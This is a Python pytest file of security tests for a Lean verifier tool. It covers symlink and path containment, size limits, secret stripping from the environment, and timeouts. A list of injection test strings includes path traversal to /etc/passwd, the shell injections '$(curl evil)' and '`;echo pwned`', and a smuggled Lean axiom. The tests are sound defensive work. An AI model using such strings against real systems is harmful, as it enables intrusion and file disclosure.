"""Security tests for path containment, limits, env stripping, and UTF-8 (R-03)."""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

from leanverifier.canonicalize import loads_strict_json, parse_rational
from leanverifier.cli import _run_checked, _strip_env, _truncate_log
from leanverifier.errors import (
    EXIT_INVALID,
    EXIT_TIMEOUT,
    InvalidInputError,
    TimeoutFailureError,
)
from leanverifier.generator import _assert_safe_output_root, write_module_atomic
from leanverifier.limits import (
    CODE_RESOURCE_MANIFEST_BYTES,
    CODE_RESOURCE_RATIONAL_CHARS,
    CODE_SYMLINK_REJECTED,
    CODE_TIMEOUT,
    CODE_UTF8_INVALID,
    MAX_MANIFEST_BYTES,
    MAX_RATIONAL_CHARS,
)
from leanverifier.manifest import load_model_path, parse_model, parse_request
from tests.fixtures.builders import make_model, make_request

pytestmark = pytest.mark.security


def _can_symlink(tmp_path: Path) -> bool:
    """Return True if this OS/user can create symlinks (Windows often cannot)."""
    target = tmp_path / "symlink-target-dir"
    target.mkdir()
    link = tmp_path / "symlink-probe"
    try:
        link.symlink_to(target, target_is_directory=True)
    except (OSError, NotImplementedError):
        return False
    return True


def test_path_escape_rejected(tmp_path: Path) -> None:
    model = parse_model(make_model([1], 0))
    req = parse_request(make_request(model.raw, [2], "1/10"))
    with pytest.raises(InvalidInputError):
        write_module_atomic(model, req, Path("relative-not-allowed"))


def test_module_name_regex() -> None:
    from leanverifier.generator import render_module

    model = parse_model(make_model([1], 0))
    req = parse_request(make_request(model.raw, [2], "1/10"))
    with pytest.raises(InvalidInputError):
        render_module(model, req, module_name="Evil")


INJECTION_STRINGS = [
    "../../etc/passwd",
    "`;echo pwned`",
    "$(curl evil)",
    "'; import Experimental",
    "end\naxiom Bad : False\n",
]


def test_injection_strings_do_not_enter_lean_body() -> None:
    from leanverifier.generator import render_module

    for payload in INJECTION_STRINGS:
        model = parse_model(make_model([1], 0, comment=payload[:512]))
        req = parse_request(make_request(model.raw, [2], "1/10"))
        _, source = render_module(model, req)
        assert payload not in source


def test_malformed_utf8_rejected_with_stable_code() -> None:
    with pytest.raises(InvalidInputError) as ei:
        loads_strict_json(b'{"a":\xff}')
    assert ei.value.code == CODE_UTF8_INVALID
    assert ei.value.exit_code == EXIT_INVALID


def test_oversized_manifest_rejected_before_decode(tmp_path: Path) -> None:
    path = tmp_path / "huge.json"
    path.write_bytes(b"{" + b"a" * (MAX_MANIFEST_BYTES + 1) + b"}")
    with pytest.raises(InvalidInputError) as ei:
        load_model_path(path)
    assert ei.value.code == CODE_RESOURCE_MANIFEST_BYTES


def test_oversized_rational_rejected() -> None:
    huge = "1/" + "1" * (MAX_RATIONAL_CHARS)
    assert len(huge) > MAX_RATIONAL_CHARS
    with pytest.raises(InvalidInputError) as ei:
        parse_rational(huge)
    assert ei.value.code == CODE_RESOURCE_RATIONAL_CHARS


def test_strip_env_drops_secrets(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "should-not-leak")
    monkeypatch.setenv("OPENAI_API_KEY", "should-not-leak")
    monkeypatch.setenv("PATH", os.environ.get("PATH", "/usr/bin"))
    env = _strip_env()
    assert "AWS_SECRET_ACCESS_KEY" not in env
    assert "OPENAI_API_KEY" not in env
    assert "PATH" in env
    assert env["LEANVERIFIER_OFFLINE"] == "1"


def test_truncate_log_respects_byte_budget() -> None:
    limit = 4096
    big = "x" * (limit + 5000)
    out = _truncate_log(big, limit=limit)
    assert len(out.encode("utf-8")) <= limit
    assert "truncated" in out


def test_subprocess_timeout_kills_and_stable_code() -> None:
    """Timeout must raise TimeoutFailureError with stable code (F-014)."""
    if sys.platform == "win32":
        argv = [sys.executable, "-c", "import time; time.sleep(30)"]
    else:
        argv = [sys.executable, "-c", "import time; time.sleep(30)"]
    with pytest.raises(TimeoutFailureError) as ei:
        _run_checked(
            argv,
            cwd=Path.cwd(),
            timeout=1,
            failure=InvalidInputError,
        )
    assert ei.value.code == CODE_TIMEOUT
    assert ei.value.exit_code == EXIT_TIMEOUT


@pytest.mark.skipif(
    sys.platform == "win32" and not os.environ.get("LEANVERIFIER_FORCE_SYMLINK_TESTS"),
    reason="Windows symlink creation often requires Developer Mode/admin",
)
def test_symlink_root_external_rejected(tmp_path: Path) -> None:
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    external = tmp_path / "external"
    external.mkdir()
    link_root = tmp_path / "out-link"
    link_root.symlink_to(external, target_is_directory=True)
    model = parse_model(make_model([1], 0))
    req = parse_request(make_request(model.raw, [2], "1/10"))
    with pytest.raises(InvalidInputError) as ei:
        write_module_atomic(model, req, link_root)
    assert ei.value.code == CODE_SYMLINK_REJECTED


def test_symlink_root_internal_rejected(tmp_path: Path) -> None:
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    real = tmp_path / "real-out"
    real.mkdir()
    link_root = tmp_path / "out-link-internal"
    link_root.symlink_to(real, target_is_directory=True)
    with pytest.raises(InvalidInputError) as ei:
        _assert_safe_output_root(link_root)
    assert ei.value.code == CODE_SYMLINK_REJECTED


def test_symlink_intermediate_dir_rejected(tmp_path: Path) -> None:
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    real_mid = tmp_path / "real-mid"
    real_mid.mkdir()
    mid_link = tmp_path / "mid-link"
    mid_link.symlink_to(real_mid, target_is_directory=True)
    out = mid_link / "nested"
    with pytest.raises(InvalidInputError) as ei:
        _assert_safe_output_root(out)
    assert ei.value.code == CODE_SYMLINK_REJECTED


def test_destination_file_symlink_rejected(tmp_path: Path) -> None:
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    out = tmp_path / "out"
    out.mkdir()
    model = parse_model(make_model([1], 0))
    req = parse_request(make_request(model.raw, [2], "1/10"))
    # Pre-create destination as a symlink to an external file.
    external = tmp_path / "external.lean"
    external.write_text("-- external\n", encoding="utf-8")
    from leanverifier.canonicalize import module_token

    name = f"GeneratedModel_{module_token(model.digest)}"
    dest = out / f"{name}.lean"
    dest.symlink_to(external)
    with pytest.raises(InvalidInputError) as ei:
        write_module_atomic(model, req, out)
    assert ei.value.code == CODE_SYMLINK_REJECTED


def test_cli_generate_does_not_resolve_before_symlink_check(tmp_path: Path) -> None:
    """CLI must pass the user out-dir through so symlink components are visible."""
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    from leanverifier import cli as cli_mod
    from leanverifier.canonicalize import canonical_json_bytes

    real = tmp_path / "real"
    real.mkdir()
    link = tmp_path / "link-out"
    link.symlink_to(real, target_is_directory=True)

    model = parse_model(make_model([1], 0))
    req = parse_request(make_request(model.raw, [2], "1/10"))
    model_path = tmp_path / "model.json"
    req_path = tmp_path / "request.json"
    model_path.write_bytes(canonical_json_bytes(model.raw))
    req_path.write_bytes(canonical_json_bytes(req.raw))

    rc = cli_mod.main(
        [
            "generate",
            "--model",
            str(model_path),
            "--request",
            str(req_path),
            "--out-dir",
            str(link),
        ]
    )
    assert rc == EXIT_INVALID


def test_verify_output_symlink_root_rejected(tmp_path: Path) -> None:
    """F-012: verify --output must reject symlink roots before resolve."""
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    from leanverifier.evidence import _assert_bundle_dir

    real = tmp_path / "real-bundle"
    real.mkdir()
    link = tmp_path / "bundle-link"
    link.symlink_to(real, target_is_directory=True)
    with pytest.raises(InvalidInputError) as ei:
        _assert_bundle_dir(link)
    assert ei.value.code == CODE_SYMLINK_REJECTED


def test_verify_output_symlink_intermediate_rejected(tmp_path: Path) -> None:
    """F-012: verify --output must reject intermediate symlink directories."""
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    from leanverifier.evidence import _assert_bundle_dir

    real_mid = tmp_path / "real-mid"
    real_mid.mkdir()
    mid_link = tmp_path / "mid-link"
    mid_link.symlink_to(real_mid, target_is_directory=True)
    with pytest.raises(InvalidInputError) as ei:
        _assert_bundle_dir(mid_link / "nested-bundle")
    assert ei.value.code == CODE_SYMLINK_REJECTED


def test_cli_verify_does_not_resolve_before_symlink_check(tmp_path: Path) -> None:
    """CLI verify must not resolve --output before symlink-component checks."""
    if not _can_symlink(tmp_path):
        pytest.skip("symlinks not creatable in this environment")
    from leanverifier import cli as cli_mod
    from leanverifier.canonicalize import canonical_json_bytes

    real = tmp_path / "real-out"
    real.mkdir()
    link = tmp_path / "link-out"
    link.symlink_to(real, target_is_directory=True)

    model = parse_model(make_model([1], 0))
    req = parse_request(make_request(model.raw, [2], "1/10"))
    model_path = tmp_path / "model.json"
    req_path = tmp_path / "request.json"
    model_path.write_bytes(canonical_json_bytes(model.raw))
    req_path.write_bytes(canonical_json_bytes(req.raw))

    rc = cli_mod.main(
        [
            "verify",
            "--model",
            str(model_path),
            "--request",
            str(req_path),
            "--output",
            str(link),
        ]
    )
    assert rc == EXIT_INVALID
